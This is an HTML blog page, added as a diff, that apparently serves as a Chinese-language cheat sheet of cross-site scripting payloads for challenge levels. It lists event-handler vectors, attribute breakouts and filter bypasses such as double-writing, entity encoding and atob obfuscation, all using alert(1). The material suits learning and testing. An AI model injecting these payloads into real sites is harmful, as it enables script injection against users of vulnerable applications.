@@ -1,0 +1,492 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XSS Payload 大全 | 拾憶</title><meta name="author" content="杰哥"><meta name="copyright" content="杰哥"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第一组：XSS 基础分类表格    关卡 类型 过滤机制 绕过方法 Payload    第一关 反射型 XSS 无过滤 直接注入 &lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Payload 大全">
+<meta property="og:url" content="https://jiege56.github.io/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/index.html">
+<meta property="og:site_name" content="拾憶">
+<meta property="og:description" content="第一组：XSS 基础分类表格    关卡 类型 过滤机制 绕过方法 Payload    第一关 反射型 XSS 无过滤 直接注入 &lt;font style&#x3D;&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs">
+<meta property="article:published_time" content="2026-07-20T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-20T15:02:50.284Z">
+<meta property="article:author" content="杰哥">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XSS Payload 大全",
+  "url": "https://jiege56.github.io/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/",
+  "image": "https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs",
+  "datePublished": "2026-07-20T04:00:00.000Z",
+  "dateModified": "2026-07-20T15:02:50.284Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "杰哥",
+      "url": "https://jiege56.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://jiege56.github.io/2026/07/20/xss%20payload%E5%A4%A7%E5%85%A8/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS Payload 大全',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><div class="bg-animation" id="web_bg" style="background-image: url(https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/111.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时光档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://s.panlai.com/zb_users/upload/2025/03/bizhihui_com_202503251742906624124197.jpg-arthumbs);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">拾憶</span></a><a class="nav-page-title" href="/"><span class="site-name">XSS Payload 大全</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时光档案</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XSS Payload 大全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-07-20T04:00:00.000Z" title="发表于 2026-07-20 12:00:00">2026-07-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-20T15:02:50.284Z" title="更新于 2026-07-20 23:02:50">2026-07-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h3 id="第一组：XSS-基础分类"><a href="#第一组：XSS-基础分类" class="headerlink" title="第一组：XSS 基础分类"></a><font style="color:rgba(0, 0, 0, 0.9);">第一组：XSS 基础分类</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">关卡</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">类型</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">过滤机制</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">绕过方法</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">Payload</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第一关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">反射型 XSS</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">无过滤</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">直接注入</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第二关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">过滤大师</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">删除 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;script&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">双写绕过</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;/textarea&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第三关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">文本清洗官</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">前端检测 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;script&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);">&#x2F;</font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;alert&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">HTML 实体编码</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&amp;lt;scr&amp;#105;pt&amp;gt;al&amp;#101;rt(1)&amp;lt;/scr&amp;#105;pt&amp;gt;&lt;/font&gt;</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="第二组：标签与事件（成就系统）"><a href="#第二组：标签与事件（成就系统）" class="headerlink" title="第二组：标签与事件（成就系统）"></a><font style="color:rgba(0, 0, 0, 0.9);">第二组：标签与事件（成就系统）</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">标签</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">事件</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">Payload</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">触发方式</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;img&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onerror&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;img src=x onerror=alert(1)&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动（加载失败）</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;details&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;ontoggle&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;details ontoggle=alert(1) open&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动（状态切换）</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onclick&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div onclick=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">点击</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;ondblclick&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div ondblclick=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">双击</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onmouseover&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div onmouseover=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">悬停</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onwheel&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div onwheel=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">滚轮</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onscroll&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div style=&quot;overflow:auto&quot; onscroll=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">滚动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;ondrag&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div draggable=&quot;true&quot; ondrag=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">拖拽</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;div&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;oncontextmenu&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;div oncontextmenu=alert(1)&gt;x&lt;/div&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">右键</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;video&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onerror&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;video src=x onerror=alert(1)&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;audio&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onerror&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;audio src=x onerror=alert(1)&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;svg&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onload&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;svg onload=alert(1)&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;input&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onfocus&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;input onfocus=alert(1) autofocus&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;body&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onload&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;body onload=alert(1)&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;marquee&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onstart&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;marquee onstart=alert(1)&gt;x&lt;/marquee&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;iframe&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;onload&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;iframe onload=alert(1)&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">自动</font></td>
+</tr>
+<tr>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;a&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;href&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;x&lt;/a&gt;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">点击</font></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="第三组：HTML-属性注入"><a href="#第三组：HTML-属性注入" class="headerlink" title="第三组：HTML 属性注入"></a><font style="color:rgba(0, 0, 0, 0.9);">第三组：HTML 属性注入</font></h3><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(245, 245, 245);">表格</font></strong></p>
+<table>
+<thead>
+<tr>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">关卡</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">场景</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">过滤</font></strong></th>
+<th align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">Payload</font></strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第一关</font></strong></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;value=&quot;[输入]&quot;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">转义 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&lt;&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&gt;&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&quot; onmouseover=alert(1)&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第二关</font></strong></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;type=&quot;hidden&quot;&lt;/font&gt;</code></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">删除 </font><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;(&lt;/font&gt;</code><br/><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;)&lt;/font&gt;</code></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;&quot; type=&quot;text&quot; onfocus=&quot;window[atob(&#39;YWxlcnQ=&#39;)](1)&quot; autofocus&lt;/font&gt;</code></td>
+</tr>
+<tr>
+<td align="left"><strong><font style="color:rgba(0, 0, 0, 0.9);">第三关</font></strong></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">日志&#x2F;Referer</font></td>
+<td align="left"><font style="color:rgba(0, 0, 0, 0.9);">全部转义</font></td>
+<td align="left"><code>&lt;font style=&quot;color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);&quot;&gt;javascript:alert(1)&lt;/font&gt;</code><br/><font style="color:rgba(0, 0, 0, 0.9);"> 在 URL 中</font></td>
+</tr>
+</tbody></table>
